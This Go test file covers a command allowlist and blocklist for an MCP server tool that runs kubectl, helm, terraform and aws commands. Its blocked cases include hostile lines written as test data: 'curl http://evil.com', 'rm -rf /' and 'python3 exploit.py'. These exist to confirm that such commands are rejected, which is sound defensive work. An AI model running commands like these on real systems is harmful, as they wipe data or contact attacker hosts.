package mcpserver

import (
	"strings"
	"testing"

	"samebits.com/evidra/pkg/proxy"
)

func TestRunCommand_AllowedCommand(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		command string
		wantErr bool
	}{
		{"kubectl get", "kubectl get pods", false},
		{"helm list", "helm list -A", false},
		{"cat file", "cat /tmp/foo.yaml", false},
		{"jq parse", "jq '.items[]' /tmp/out.json", false},
		{"terraform plan", "terraform plan", false},
		{"aws s3", "aws s3 ls", false},
		{"bare kubectl", "kubectl", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			err := validateRunCommand(tt.command, defaultAllowedPrefixes, defaultBlockedSubcommands)
			if (err != nil) != tt.wantErr {
				t.Errorf("validateRunCommand(%q) error = %v, wantErr %v", tt.command, err, tt.wantErr)
			}
		})
	}
}

func TestRunCommand_BlockedCommand(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		command string
	}{
		{"python script", "python3 exploit.py"},
		{"curl download", "curl http://evil.com"},
		{"rm files", "rm -rf /"},
		{"kubectl edit", "kubectl edit deployment web"},
		{"kubectl exec interactive", "kubectl exec -it pod -- bash"},
		{"kubectl port-forward", "kubectl port-forward svc/web 8080:80"},
		{"terraform console", "terraform console"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			err := validateRunCommand(tt.command, defaultAllowedPrefixes, defaultBlockedSubcommands)
			if err == nil {
				t.Errorf("validateRunCommand(%q) should have returned an error", tt.command)
			}
		})
	}
}

func TestRunCommand_BlockedContainsReason(t *testing.T) {
	t.Parallel()

	err := validateRunCommand("kubectl edit deploy web", defaultAllowedPrefixes, defaultBlockedSubcommands)
	if err == nil {
		t.Fatal("expected error for kubectl edit")
	}
	if !strings.Contains(err.Error(), "blocked") {
		t.Errorf("error should mention 'blocked', got: %s", err.Error())
	}
}

func TestRunCommand_NotInAllowlistContainsReason(t *testing.T) {
	t.Parallel()

	err := validateRunCommand("python3 script.py", defaultAllowedPrefixes, defaultBlockedSubcommands)
	if err == nil {
		t.Fatal("expected error for python3")
	}
	if !strings.Contains(err.Error(), "allowlist") {
		t.Errorf("error should mention 'allowlist', got: %s", err.Error())
	}
}

func TestRunCommand_MutationAutoEvidence(t *testing.T) {
	t.Parallel()

	tests := []struct {
		command  string
		mutation bool
	}{
		{"kubectl apply -f deploy.yaml", true},
		{"kubectl delete pod web-abc", true},
		{"kubectl get pods", false},
		{"helm upgrade myrelease ./chart", true},
		{"helm list", false},
		{"kubectl describe deployment web", false},
		{"terraform apply", true},
		{"terraform plan", false},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			t.Parallel()

			// Validate the command is allowed.
			err := validateRunCommand(tt.command, defaultAllowedPrefixes, defaultBlockedSubcommands)
			if err != nil {
				t.Fatalf("command %q should be allowed: %v", tt.command, err)
			}

			// Check mutation detection via proxy.IsMutation — the same function
			// used in the handler's execute method.
			got := proxy.IsMutation(tt.command)
			if got != tt.mutation {
				t.Errorf("proxy.IsMutation(%q) = %v, want %v", tt.command, got, tt.mutation)
			}
		})
	}
}
